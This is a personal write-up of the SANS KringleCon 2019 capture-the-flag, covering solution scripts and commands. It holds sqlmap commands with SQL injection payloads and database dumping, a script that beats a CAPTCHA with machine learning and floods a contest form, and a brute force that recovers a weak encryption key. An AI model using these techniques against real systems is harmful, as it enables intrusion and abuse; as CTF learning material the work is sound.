---
title: Kringlecon 2019 Write-Up
date: 2020-01-15
category: it
tags: ctf, pdftotext, python, programming, language, security, sudo, trail, of, tears
<!-- prettier-ignore -->

## The challenges

Hoe the season to be jolly! Been giving a few [CTFs](https://en.wikipedia.org/wiki/Capture_the_flag_(disambiguation))  lately. It started with the disobey 2020 [puzzle](https://disobey2020.github.io/) to get the hacker ticket. Then there was the [OverTheWire](https://overthewire.org/)'s 2019 advent CTF. And finally this one, the SANS holiday hackmechallenge - [KringleCon](https://holidayhackchallenge.com/2019/) 2019. As of writing I got what felt like quite far in the disobey but got real nice stuck in the second keyhole. For OTF I found a similar but slightly easier challenge on the 6th day December, but did not manage to get the key. Most others except the first and challenge-zero I didn't really have time for. So with not so much progress it was very nice to take a step back and try out KringleCon where I managed to get a bit further!

Short tldr of methods to answers to the objectives

1. talkt to santa: go upupuppu and click click click :)
2. find turtle doves: mm they were in the union
3. unredact: at the time I was on ski holiday so used **termux** on my phone and installed **pdf2txt** there to unredact it :) Fun to use the phone :)
4. windows event log outcome: clicked around until I found something that looked suspicious. I think it was a filename that looked sensitive.
5. windows event log technique: parsed these with python to print command\_line and procerss\_name the cat
6. network log - compromised system: got it to print IPs with python
7. splunk: followed the chat, was quite a nice way to learn the tool. Finding the correct file in the archive was a bit tricky, had to read through the chats carefully several times :)
8. steam tunnels: the physical key! Spent quite some time wandering around trying to find the key. Eventually gave up. Then tried again after making it into the sleigh shop and hey there it was :) Couldn't really get the decoder to line up so used pixels mostly, took 5 times or so :)
9. captcha: super fun, most fun. Hadn't tensorflowed before. Followed the youtube and github repo basically. Used an 80core 365GB cloud instance from $dayjob for a short while as the 2core 2GB RAM instance I used was too small ;)
10. scraps: hadn't used sqlmap before either. First mapped out the page manually to find the forms. Then learnt about sqlmap --crawl :) Money shot for me was --eval="import requests;token=requests.get('<https://studentportal.elfu.org/validator.php').text>"
11. elfscrow: So. Hard. Learnt a bit more assembly reading. Used IDA this time instead of my previous attempts with radare2. Wonder when I'll get better at these :)
12. sleigh shop door. also very fun to unlock those locks! Did not solve it under 5s but the one slower than that.
13. filter out poisoned: ugh this one was tedious. Actually this and previous I did spend some time trying to learn them, but in the end found a write-up that was published too early (and later removed but still in google cache..)

## Getting on with it

- The pdf deobfuscate I could do on my phone in termux just a pkg install pdftotext :)
- The nyancat took a bit of more time than I should admit, but primarily I forgot how sudo works and what sudo -u does..
- The frosty keypad I got to write a small python script: (also on a wall somewhere :)

```python
#!/usr/bin/python3
import random

#numbers = [ 1, 3, 7 ]

results = []

length = 4
digits = 1337

# from https://linuxconfig.org/function-to-check-for-a-prime-number-with-python
def is_prime_number(x):
  if x >= 2:
    for y in range(2,x):
      if not ( x % y ):
        return(False)
  else:
    return(False)
  return(True)

# from https://trinket.io/python3/00754ec904
while len(results) < 1000:
     for digit in range(1):
       digits =''.join(str(random.randint(0, 9)) for i in range(length))
       if "3" in digits and "1" in digits and "7" in digits and not "0" in digits and not "2" in digits and not "4" in digits and not "5" in digits and not "6" in digits and not "8" in digits and not "9" in digits:
         if digits not in results:
           if is_prime_number(int(digits)):
             results.append(digits)
             print(digits)
```

You'll need to hit CTRL+C when it doesn't find any more solutions. It's not the fastest, has unused bits and I don't know why it has the for digit in range(1) bit.

## On to the next challenge

- The windows events log file I just opened the file on a Windows machine and looked around
- The sysmon file I printed some interesting keys in the json strings with a tiny python script

```python
#!/usr/bin/python3
import json

with open('sysmon-data.json') as json_file:
    data = json.load(json_file)
    for p in data:
        try:
            print(p['command_line'])
        except:
            print(p['process_name'])
```

- For the splunk basically just followed the chats. A bit tricky to be fair! By luck I had managed to already download the correct file from the Archive but did not look at it deep enough..
- For the greylog just clicked around. I liked the "quick table" feature and that got me some of the questions fairly quickly without having to write more narrow searches. Quite a few steps needed for this so took some time. It was nice to get to compare greylog and splunk, I've only used a vanilla ELK stack before and last version 5. With that in mind the discover data was for me a bit easier on greylog.
- Trail of tears I just beat the game on easy :) (_/edit turns_ one can solve this on hard

## Next one was a powershell one! The laser adjuster :P

Finally got to get a bit familiar with powershell. I'm a lurker on [r/sysadmin](https://www.reddit.com/r/sysadmin/) and very often there are powershell oneliners on display there. This was quite a fun one to be honest :) Kind of like using python directly in the shell.

Some things I learnt were:

- Get-History shows stuff! But no .bash\_history so I actually wonder where this history is from? It's not in .local/powershell...
- Trying to bruteforce this one manually was very slow so I gave that up fairly quickly.
- I tried to find a way into reading the python code that powered the website. Only found the process id but no open files visible. Would need to get root for that I suppose..
- figured out how to -X POST a body for the gases!
- hints in chat suggested powering off and on
- $env has things!
- Format-Hex -Path ./archive | Select-Object -First 1
  - magic number 50 4B 03 == zip
  - expand-archive
  - chmod +x
  - get-content riddle # Gives an md5sum
- md5sum hunter

```powershell
$files = Get-childitem -Path /home/elf/depths -recurse -File
Foreach ($file in $files)
 {
     if((Get-FileHash -Path $file.fullname -Algorithm MD5).hash | Select-String 25520151A320B5B0D21561F92C8F6224){
       $file
     }
 }
```

Could have found this with a recurse grep for temperature -e angle -e param..

The solution:

```bash
(Invoke-WebRequest -Uri http://localhost:1225/api/off).RawContent                                       $correct_gases_postbody = @{O='6';H='7';He='3';N='4';Ne='22';Ar='11';Xe='10';F='20';Kr='8';Rn='9'}      (Invoke-WebRequest -Uri http://localhost:1225/api/gas -Method POST -Body $correct_gases_postbody).RawContent
(Invoke-WebRequest http://127.0.0.1:1225/api/angle?val=65.5).RawContent
(Invoke-WebRequest http://127.0.0.1:1225/api/temperature?val=-33.5).RawContent
(Invoke-WebRequest http://127.0.0.1:1225/api/refraction?val=1.867).RawContent
(Invoke-WebRequest -Uri http://localhost:1225/api/on).RawContent
(Invoke-WebRequest -Uri http://localhost:1225/api/output).RawContent
```

## iptables

- Iptables/ smart bracelet one: think I was close or did complete this but Kent did not agree? Went back and tried this again slowly by first writing the commands in a text file

```bash
#1
sudo iptables -P FORWARD DROP

sudo iptables -P INPUT DROP

sudo iptables -P OUTPUT DROP

#2
# shouldbe in two lines? as the iptables output orders them related,established..
sudo iptables -A INPUT -m state --state ESTABLISHED,RELATED -j ACCEPT
sudo iptables -A OUTPUT -m state --state ESTABLISHED,RELATED -j ACCEPT

#3
sudo iptables -A INPUT -p tcp --dport 22 -s 172.19.0.225 -j ACCEPT

#4
sudo iptables -A INPUT -p tcp --dport 21 -s 0.0.0.0/0 -j ACCEPT
sudo iptables -A INPUT -p tcp --dport 80 -s 0.0.0.0/0 -j ACCEPT

#5
sudo iptables -A OUTPUT -p tcp --dport 80 -d 0.0.0.0/0 -j ACCEPT

#6
sudo iptables -A INPUT -i lo -j ACCEPT

Kent TinselTooth: Great, you hardened my IOT Smart Braces firewall!
```

- _Sled Route API : Got the login. Next to figure out which requests were bad and how to fill in 100 on the web page... Maybe one can figure out the firewall API? Hmm played a bit with elasticsearch.. then gave up.. in the meantime went ahead to:_

## Sleigh Shop Door

- Ah this isfun! While poking through the web source after fixing the smartbracelet found the URL to the sleigh shop in teh source. It had a bunch of locks.

haha! if you reload the page the codes needed are different!

1. B46DU583 - top of the console
2. XNUBLBKW - see it by lookingin ctrl p
3. unknown, fetched but never shown..

ha this was funneh, so clicking around the tabs found a javascript that needed some deobfuscate/jsnice.org and it found var _0x1e21

so I ran that in the console with the values found in if statements and eventually:

`console.log(_0x1e21["jIdunh"]);`

 and it printed a bunch of things, and element 34 had an image:

```bash
console.log(_0x1e21["jIdunh"][34]);
VM3008:1 images/73cda8f4-6dc7-4edc-adb8-b2bd4b3ecd12.png
```

which was image with combination to the 3rd lock

1. ILMJRNTP found in local storage
1. CJ4WCMG4 - `<title></title>`

1. from the card.. Y3WJVE01 sticker - but if one removes the hologram CSS the letters are in a different order JYV0EW13.
1. G7LDS1LS - font family

1. VERONICA In the event that the .eggs go bad, you must figure out who will be sad.
From client.js and then deobfuscated to make it a bit readable and just read through

1. 8SEOGRW1
chakra in css file

<https://sleighworkshopdoor.elfu.org/css/styles.css/73cda8f4-6dc7-4edc-adb8-b2bd4b3ecd12>

1. compopnent.swab, bunch of things around lock c10

finding .locks > li > .lock.c10 .cover

one can remove the cover

on the board there's a code: KD29XJ37

but all the other codes have been per session..

console.log says "Missing macaroni"

In the code there's:

```bash
 console["log"]("Well done! Here's the password:");
 console[_0x1e21("0x45")]("%c" + args["reward"], _0x1e21("0x46"));
 ```

In the console there's this whenever one presses the unlock:

```bash
73cda8f4-6dc7-4edc-adb8-b2bd4b3ecd12:1 Error: Missing macaroni!
    at HTMLButtonElement.<anonymous> (73cda8f4-6dc7-4edc-adb8-b2bd4b3ecd12:1)
(anonymous) @ 73cda8f4-6dc7-4edc-adb8-b2bd4b3ecd12:1
```

there's a bunch of iv class="component gnome, mac, swab" with data-codes: XJ0 A33 J39

Dragging the components further down changed the error and printed this in the console:

Well done! Here is the password:

> 73cda8f4-6dc7-4edc-adb8-b2bd4b3ecd12:1 The Tooth Fairy
> 73cda8f4-6dc7-4edc-adb8-b2bd4b3ecd12:1 You opened the chest in 6291.088 seconds
> 73cda8f4-6dc7-4edc-adb8-b2bd4b3ecd12:1 Well done! Do you have what it takes to Crack the Crate in under three minutes?
> 73cda8f4-6dc7-4edc-adb8-b2bd4b3ecd12:1 Feel free to use this handy image to share your score!

- Doing the combination locks in under 3 minutes I think can be done manually.
  - But nice thing to do would be to enter a bunch of commands into the browser console to help with some programmatically. Maybe one can enter javascript to also enter the numbers into the locks??

console.log(document.title)
some are maybe fixed??:
VERONICA
KD29XJ37

However, after doing that as fast as I could manually:

> You opened the chest in 150.151 seconds
> 621c8819-1d6a-4d77-bd41-5214a6beccf5:1 Very impressive!! But can you Crack the Crate in less than five seconds?
> 621c8819-1d6a-4d77-bd41-5214a6beccf5:1 Feel free to use this handy image to share your score!

- For that I'm thinking burp suite to automate the browser is needed?
- When inside the Sled Shop there was a request to get the IP for the connection with longest duration:

```bash
head conn.log|jq '.["id.orig_h"],.duration' -c 'sort_by(.duration)'
cat conn.log|jq -s -c 'sort_by(.duration)' > /tmp/sorted
cat /tmp/sorted#... took forever, then just looked at the bottom:
                                                                                                                       {"ts":"2019-0
4-18T21:27:45.402479Z","uid":"CmYAZn10sInxVD5WWd","id.orig_h":"192.168.52.132","id.orig_p":8,"id.r                     esp_h":"13.107.21.200","id.resp_p":0,"proto":"icmp","duration":1019365.337758,"orig_bytes":3078192                     0,"resp_bytes":30382240,"conn_state":"OTH","missed_bytes":0,"orig_pkts":961935,"orig_ip_bytes":577                     16100,"resp_pkts":949445,"resp_ip_bytes":56966700}]   
```

Finishing each challenge gives some tips to some other challenges. There was a hint to the Sled Route API suggesting to use jq. And there was another that if you beat the Trail Game on Hard there's more hints? Also beating the lock game in under 3 minutes is another hint I think..

- Next one I managed was the key bitting one to get into the Steam Tunnels! There was a good talk on this topic with a link to [https://github.com/deviantollam/decoding](https://github.com/deviantollam/decoding) and then just used that and tried maybe 5 keys before finding the right now. GIMP is not my specialty but the decoders helped a bit. The image of the key was not discoverable until one got into the Sleigh Shop.

## Image AI

And then we get to the CAPTCHA + tensorflow madness! This was real fun, haven't had to do much with tensorflow before. Did not have to read much at all about tensorflow to get this going, could basically just glue together the provided python scripts.

Another very good kringlecon talk on this topic: [https://www.youtube.com/watch?v=jmVPLwjm\_zs&feature=youtu.be](https://www.youtube.com/watch?v=jmVPLwjm_zs&feature=youtu.be) led to a github repo. Some other code and training images were found as soon as one got far enough into the Steam Tunnels. I managed to after not too much googling get the python script to store the images in teh CAPTEHA in a directory and then run the predict tensorflow python script on the github repo against it. It was however too slow. Fortunately I had access to a machine with lots of cores so moving all the data there and re-running the python got it working for me. 2 oversubscribed cores and 2GB RAM was too little. 80 dedicated single server skylake cores and 356GB RAM completed it much faster. There were messages about tensorflow from pip not having been compiled with all the things enabled. I could I suppose also have tried this with a GPU :) And the PYTHON:

```python
#!/usr/bin/env python3
# Fridosleigh.com CAPTEHA API - Made by Krampus Hollyfeld
import requests
import json
import sys
import os
import shutil
import base64

os.environ['TF_CPP_MIN_LOG_LEVEL'] = '3'
import tensorflow as tf
tf.logging.set_verbosity(tf.logging.ERROR)
import numpy as np
import threading
import queue
import time

def load_labels(label_file):
    label = []
    proto_as_ascii_lines = tf.gfile.GFile(label_file).readlines()
    for l in proto_as_ascii_lines:
        label.append(l.rstrip())
    return label

def predict_image(q, sess, graph, image_bytes, img_full_path, labels, input_operation, output_operation):
    image = read_tensor_from_image_bytes(image_bytes)
    results = sess.run(output_operation.outputs[0], {
        input_operation.outputs[0]: image
    })
    results = np.squeeze(results)
    prediction = results.argsort()[-5:][::-1][0]
    q.put( {'img_full_path':img_full_path, 'prediction':labels[prediction].title(), 'percent':results[prediction]} )

def load_graph(model_file):
    graph = tf.Graph()
    graph_def = tf.GraphDef()
    with open(model_file, "rb") as f:
        graph_def.ParseFromString(f.read())
    with graph.as_default():
        tf.import_graph_def(graph_def)
    return graph

def read_tensor_from_image_bytes(imagebytes, input_height=299, input_width=299, input_mean=0, input_std=255):
    image_reader = tf.image.decode_png( imagebytes, channels=3, name="png_reader")
    float_caster = tf.cast(image_reader, tf.float32)
    dims_expander = tf.expand_dims(float_caster, 0)
    resized = tf.image.resize_bilinear(dims_expander, [input_height, input_width])
    normalized = tf.divide(tf.subtract(resized, [input_mean]), [input_std])
    sess = tf.compat.v1.Session()
    result = sess.run(normalized)
    return result

########### above is from predict_images_using_trained_model.py because python and import meh

###########

def main():
    yourREALemailAddress = "MYREALEmAEL@example.org"

    # Creating a session to handle cookies
    s = requests.Session()
    url = "https://fridosleigh.com/"

    json_resp = json.loads(s.get("{}api/capteha/request".format(url)).text)
    b64_images = json_resp['images']                    # A list of dictionaries eaching containing the keys 'base64' and 'uuid'
    challenge_image_type = json_resp['select_type'].split(',')     # The Image types the CAPTEHA Challenge is looking for.
    challenge_image_types = [challenge_image_type[0].strip(), challenge_image_type[1].strip(), challenge_image_type[2].replace(' and ','').strip()] # cleaning and formatting

    #print(b64_images)
    # 0 wipe unknown_images dir
    # why wipe it tho?
    try:
        shutil.rmtree('unknown_images')
    except:
        os.mkdir('unknown_images')
    try:
        os.mkdir('unknown_images')
    except:
        True
    # 1 write b64 to unknown_images dir

    imgcnt = 0
    for image in b64_images:
        imgcnt = imgcnt + 1
        content = image['base64']
        uuid = image['uuid']

        try:
           content=base64.b64decode(content)
           filename = "unknown_images/%s" % uuid
           with open(filename,"wb") as f:
                f.write(content)
                #f.write(content.decode("utf-8"))
        except Exception as e:
           print(str(e))
    #    if imgcnt > 10:
     #       break
    # 2 run the predict against it
    #  python3 predict_images_using_trained_model.py would have been fun instead we copy pasta
    # https://github.com/chrisjd20/img_rec_tf_ml_demo/blob/master/retrain.py talks about mobilenet and speed optimizations..

    # Loading the Trained Machine Learning Model created from running retrain.py on the training_images directory
    graph = load_graph('/tmp/retrain_tmp/output_graph.pb')
    labels = load_labels("/tmp/retrain_tmp/output_labels.txt")

    # Load up our session
    input_operation = graph.get_operation_by_name("import/Placeholder")
    output_operation = graph.get_operation_by_name("import/final_result")
    sess = tf.compat.v1.Session(graph=graph)

    # Can use queues and threading to spead up the processing
    q = queue.Queue()
    unknown_images_dir = 'unknown_images'
    unknown_images = os.listdir(unknown_images_dir)

    #Going to interate over each of our images.
    for image in unknown_images:
        img_full_path = '{}/{}'.format(unknown_images_dir, image)

        print('Processing Image {}'.format(img_full_path))
        # We don't want to process too many images at once. 10 threads max
        while len(threading.enumerate()) > 10:
            time.sleep(0.0001)

        #predict_image function is expecting png image bytes so we read image as 'rb' to get a bytes object
        image_bytes = open(img_full_path,'rb').read()
        threading.Thread(target=predict_image, args=(q, sess, graph, image_bytes, img_full_path, labels, input_operation, output_operation)).start()

    print('Waiting For Threads to Finish...')
    while q.qsize() < len(unknown_images):
        time.sleep(0.001)

    #getting a list of all threads returned results
    prediction_results = [q.get() for x in range(q.qsize())]

    #do something with our results... Like print them to the screen.

    # 3 get a list of the uuids for each type
    good_images = []
    for prediction in prediction_results:
        print('TensorFlow Predicted {img_full_path} is a {prediction} with {percent:.2%} Accuracy'.format(**prediction))        if prediction['prediction'] in challenge_image_types:
            good_images.append(prediction['img_full_path'].split('/')[1])
    # TensorFlow Predicted unknown_images/dc646068-e584-11e9-97c1-309c23aaf0ac is a Santa Hats with 99.86% Accuracy

    # 4 make a new b64_images csv list with the uuids
    print(challenge_image_types)
    print(good_images)
    good_images_csv = ','.join(good_images)

    '''
    MISSING IMAGE PROCESSING AND ML IMAGE PREDICTION CODE GOES HERE
    '''

    # This should be JUST a csv list image uuids ML predicted to match the challenge_image_type .
    #final_answer = ','.join( [ img['uuid'] for img in b64_images ] )
    final_answer = good_images_csv

    json_resp = json.loads(s.post("{}api/capteha/submit".format(url), data={'answer':final_answer}).text)
    if not json_resp['request']:
        # If it fails just run again. ML might get one wrong occasionally
        print('FAILED MACHINE LEARNING GUESS')
        print('--------------------\nOur ML Guess:\n--------------------\n{}'.format(final_answer))
        print('--------------------\nServer Response:\n--------------------\n{}'.format(json_resp['data']))
        sys.exit(1)

    print('CAPTEHA Solved!')
    # If we get to here, we are successful and can submit a bunch of entries till we win
    userinfo = {
        'name':'Krampus Hollyfeld',
        'email':yourREALemailAddress,
        'age':180,
        'about':"Cause they're so flippin yummy!",
        'favorites':'thickmints'
    }
    # If we win the once-per minute drawing, it will tell us we were emailed.
    # Should be no more than 200 times before we win. If more, somethings wrong.
    entry_response = ''
    entry_count = 1
    while yourREALemailAddress not in entry_response and entry_count < 200:
        print('Submitting lots of entries until we win the contest! Entry #{}'.format(entry_count))
        entry_response = s.post("{}api/entry".format(url), data=userinfo).text
        entry_count += 1
    print(entry_response)


if __name__ == "__main__":
    main()
```

## NEEEXT! Student Body finding some scrap papers objective 9

- Got some hints in the game talking about sqlmap. Let's play with that and learn about [SQL injections](https://www.owasp.org/index.php/Testing_for_SQL_Injection_(OTG-INPVAL-005)) :)
  - Started by looking at the page and reading the source code. Identified two forms on two pages that looked interesting.
  - First went down a rabbit hole of the sqlmap tamper scripts.
  - Just doing this:

```bash
#!/bin/bash
token=$(curl validation)
sqlmap --url="https://url?token=$token" -p variable
```

- Got sqlmap to find that elfmail in the check.php was vulnerable.
- a curl "<https://url?elfmail=me@me.com'token=$token>"
  - got a noice SQL error!
- tamper investigation was not wasted because

```bash
#!/bin/bash
token=$(curl validation)
sqlmap --url="https://studentportal.elfu.org/application-check.php?elfmail=my%40example.com&token=$token" -p elfmail --eval="import requests;token=requests.get('https://studentportal.elfu.org/validator.php').text"
```

- was needed to get sqlmap to find some techniques. Presumably the token only worked for the first tests.

```bash
#SNIPSNIP
Parameter: elfmail (GET)
    Type: boolean-based blind
    Title: AND boolean-based blind - WHERE or HAVING clause
    Payload: elfmail=my@example.com' AND 2977=2977 AND 'tYvj'='tYvj&token=MTAwOTU4MTk3Njk2MTU3NzQ3MTgzOTEwMDk1ODE5Ny42OTY=_MTI5MjI2NDkzMDUwODgzMjMwNjYyMzI2LjI3Mg==

    Type: error-based
    Title: MySQL >= 5.0 AND error-based - WHERE, HAVING, ORDER BY or GROUP BY clause (FLOOR)
    Payload: elfmail=me@example.com' AND (SELECT 4602 FROM(SELECT COUNT(*),CONCAT(0x7176786a71,(SELECT (ELT(4602=4602,1))),0x7162626a71,FLOOR(RAND(0)*2))x FROM INFORMATION_SCHEMA.PLUGINS GROUP BY x)a) AND 'XazW'='XazW&token=MTAwOTU4MTk3Njk2MTU3NzQ3MTgzOTEwMDk1ODE5Ny42OTY=_MTI5MjI2NDkzMDUwODgzMjMwNjYyMzI2LjI3Mg==
```

Could not get the above queries to work in a curl.. maybe some escape messup. But sqlmap --users find stuff.

```bash
[18:51:19] [INFO] retrieved: 'elfu'
[18:51:20] [INFO] retrieved: 'applications'
[18:51:21] [INFO] retrieved: 'elfu'
[18:51:22] [INFO] retrieved: 'krampus'
[18:51:23] [INFO] retrieved: 'elfu'
```

sqlmap had a nice --sql-shell and with that one could "select \* from elfu.krampus" which got us some paths:

```bash
select * from elfu.krampus [6]:
[*] /krampus/0f5f510e.png, 1
[*] /krampus/1cc7e121.png, 2
[*] /krampus/439f15e6.png, 3
[*] /krampus/667d6896.png, 4
[*] /krampus/adb798ca.png, 5
[*] /krampus/ba417715.png, 6
```

Now then that looks like an OS path, need to run a shell command.. but on a whim tried [https://studentportal.elfu.org/krampus/](https://studentportal.elfu.org/krampus/) and yay found them there. Fired up good old GIMP and learnt about the rotate tool :P Yay, **one** more objective!

## Remaining are reversing some crypto windows executable and the ban the IPs in the firewall for the route API

Crypto then. Hint is [https://www.youtube.com/watch?v=obJdpKDpFBA&feature=youtu.be](https://www.youtube.com/watch?v=obJdpKDpFBA&feature=youtu.be) > [https://github.com/CounterHack/reversing-crypto-talk-public](https://github.com/CounterHack/reversing-crypto-talk-public)

Running an encryption tells us it uses unix epoch as a seed and a hint to the challenge was " We know that it was encrypted on December 6, 2019, between 7pm and 9pm UTC. " This is from **1575658800 to 1575666000** . There are some super\_secure\_random and super\_secure\_srand functions found with IDA freeware. Probably they are not super. [https://docs.microsoft.com/en-us/windows/win32/api/wincrypt/nf-wincrypt-cryptimportkey](https://docs.microsoft.com/en-us/windows/win32/api/wincrypt/nf-wincrypt-cryptimportkey) for example is one in use. I wonder what the difference with --insecure is? One error talks about [DES-CBC](https://crypto.stackexchange.com/questions/62771/is-des-secure-under-cbc) which internet says is insecure. It uses 56-bits and 8bytes. Stack of do\_encrypt also says "dd 8" so yay?

```bash
00000000 ; [00000008 BYTES. COLLAPSED UNION  _LARGE_INTEGER. PRESS CTRL-NUMPAD+ TO EXPAND]
00000000 ; [00000008 BYTES. COLLAPSED STRUCT $FAF74743FBE1C8632047CFB668F7028A. PRESS CTRL-NUMPAD+ TO EXPAND]
```

Which is used in security\_init\_cookie And imp\_\_QueryPerformanceCounter. Way more than 8 bytes though.

While looking at these listened to the youtube talk and it said "running it at the same time generates the same key" - tried that with two identical files and it generated the same key. What about with two files without same checksum? Yep. Same. Encryption key. So next step would be to try to encrypt something for every second between **1575658800 to 1575666000** ? That's 7200. Which would give us 7200 keys we could try to use to decrypt the file. Is it too much? Right now I'm thinking the --insecure might help if one use the Burp suite to intercept the packages to the elfscrow api server? The time bit in the code uses time64

call time into eax  
then eax as a parameter into:  
call super\_secure\_srand  
there is a loop (8) and inside that it calls super\_secure\_random which looks complicated but by googling the numbers in decimal we find: [https://rosettacode.org/wiki/Linear\_congruential\_generator#C](https://rosettacode.org/wiki/Linear_congruential_generator#C)

which has

```bash
rseed * 214013 + 2531011
# the disasembled then does:
sar     eax, 10h
and     eax, 7FFFh

```

Which is also here: <http://cer.freeshell.org/renma/LibraryRandomNumber/>  
And here I learnt that >> in python is the sar.

After goin walking thought a bit about what is the end goal here. And it is not the key, but it could be. Right now plan is to generate the secret-id, because the secret-id is what is used to decrypt with the tool, not the key. But maybe the uuid is something you only get from the escrow API server.

```bash
$ curl -XPOST http://elfscrow.elfu.org/api/store -d 1234567890abcdef
0e5b05dd-e132-42aa-b699-1829d3e23e2f
$ curl -XPOST http://elfscrow.elfu.org/api/retrieve -d 0e5b05dd-e132-42aa-b699-1829d3e23e2f
1234567890abcdef
```

Seems it is. And the hex needs to be in lower letters. ABCDEF did not fly. UUID must be in this format: 00000000-0000-0000-0000-000000000000 it seems. Not sure about sqlmap use here. . SSH and web server is running. But SSH has been open on several previous addresses in this CTF too..

```bash
 WEBrick/1.4.2 (Ruby/2.6.3/2019-04-16) at
 elfscrow.elfu.org:443
```

Actually what might be doable with just the key is to: setup my own API server that just returns the key.. _Change the address in the binary or finally use BURP or local DNS override?_ Still need to figure out the key :))

## Let's try to read the do\_encrypt again

1. call read\_file
2. set some crypto vars
3. call CryptAcquireContext
4. call generate\_key
    1. key goes into eax register I think
5. call print\_hex
6. more crypto
7. call CryptImport and CryptEncrypt
8. call store\_key and write\_file
9. call security\_check\_cookie

Generate\_key does:

1. call time
2. call **super\_secure\_srand**, probably with file,time and seed as args
3. loop 8 times and call **super\_secure\_random** to modify state?

```bash
call    ?super_secure_random@@YAHXZ ; super_secure_random(void)
movzx   ecx, al
and     ecx, 0FFh
mov     edx, [ebp+buffer]
add     edx, [ebp+i]
mov     [edx], cl
```

super_secure_srand does:

something with seed.. really unsure

super_secure_srandom does:

this is doing the rseed, sar, and

## The Key Writer

```python
#!/usr/bin/python3


# key examples

# dcd5ed4c2acba87e
# 9f32148fe8ef55a8
# 0d2bac4df0a12e5a
# fa41fb5131993bf5

#https://www.aldeid.com/wiki/X86-assembly/Instructions/shr
# like the >> much more than ^

# https://rosettacode.org/wiki/Linear_congruential_generator#Python
def msvcrt_rand(seed):
    def rand():
      nonlocal seed
      fixed = seed
      keyarray = bytearray()
      for i in range(8):
        #ka = (214013*seed + 2531011)
        fixed = fixed * 0x343fd + 0x269ec3
        key = hex(fixed >> 0x10 & 0x7ffffff)[-2:] # >> sar 16 & is and. We only want the last two bytes - the start look very similar..
        if 'x' in key:
            key = key.replace('x', '0') # because movzx
        key = bytes.fromhex(key)
        keyarray.append(key[0])
      return(keyarray) # last two
    return(rand())

seed = range(1575658800,1575666001)
# so not off by 1                ^
for rseed in seed:
  two = msvcrt_rand(rseed)
  print(two.hex())
```

Trying the edit hosts file. As I use WSL I learnt that for .exe files I also need to update window's hosts file, even though I run it from inside the WSL! Also the syntax is **NOT**:

```bash
localhost elfscrow.elfu.org
```

Bunch of false positives for some reason... when I use the list of keys I generated and my API and a localhost flask API and hosts file override. Anyway, let this run and used file to stop when it found a pdf, it stopped at 4849 (or 4850th key in keys \[\] in my python api.py, unsure if that is sorted.. so the creation time might have been 1575663650 ( _Friday, December 6, 2019 8:20:50 PM_ ) :

```bash
#!/bin/bash

# the Bruter

for i in $(seq 0 7200); do
  ./elfscrow.exe --decrypt --id=7debfae7-3a16-41e7-b211-678f5ebdce00 ElfUResearchLabsSuperSledOMaticQuickStartGuideV1.2.pdf.enc out.pdf --insecure
  if [ -f out.pdf ]; then
          isitpdf=$(file out.pdf|grep -c PDF)
          if [ $isitpdf != 0 ]; then
            echo $isitpdf
            echo "GOT IT $i"
            exit 123
          else
            mv -v out.pdf "falses/$i.pdf"
          fi
  fi
done
```

and the API.py

```python
#https://stoplight.io/python-rest-api/
from flask import Flask, json
import os

keys = ["b5ad6a321240fbec", "7200...", "7199", "..."]
api = Flask(__name__)

@api.route('/api/retrieve', methods=['POST'])
def get_companies():
  # store last key tested in a file

  statefile = "/root/elfscrow_status"
  with open(statefile,"r") as r:
    content = r.read()
    try:
      int(content)
    except ValueError:
      with open(statefile,"w+") as f:
        f.write("0")
      return("0")

    icontent = int(content)
    ncontent = int(content) + 1
    print("Last was %s, updating to %s" % (icontent, ncontent))

    with open(statefile,"w+") as f:
      f.write(str(ncontent))

  return str(keys[ncontent])
  #return json.dumps(companies)

if __name__ == '__main__':
    api.run(port=80)
```

Then to get the key was just a pdf2txt and the 5 word sentence in the beginning of the document!

## OK THE ZEEK/BRO Logs is the last one?

The username was found in <https://srf.elfu.org/README.md>

Started on this earlier but stopped because I wasn't feeling it and it was a bit tedious.  
Plan: Make the queries programmatically. Also this time check sizes of requests maybe that's important. Also time when attacks happen could be useful?

let's try out [RITA](https://github.com/activecm/rita) as indicated in a hint, also found [Malcolm](https://github.com/idaholab/Malcolm) while looking up this tool.. could be fun. But at least RITA couldn't import the http.log :/

weird that the IPs in with the LFI, shellshock etc haven't posted.. maybe they posted later?

Wow you made it all this way? Prepare for a bit of downer! :)

_In the end I ran out of time. End of new year approached and some busy times in January 2020! Turned out I got quite far with a python script, but had too many good IPs in my list I think. In the end I used a JQ solution found in a writeup that is available in the google cache, initially found by searching for the numbers used for the srand function in the elfscrow challenge._

[https://downloads.elfu.org/LetterOfWintryMagic.pdf](https://downloads.elfu.org/LetterOfWintryMagic.pdf)
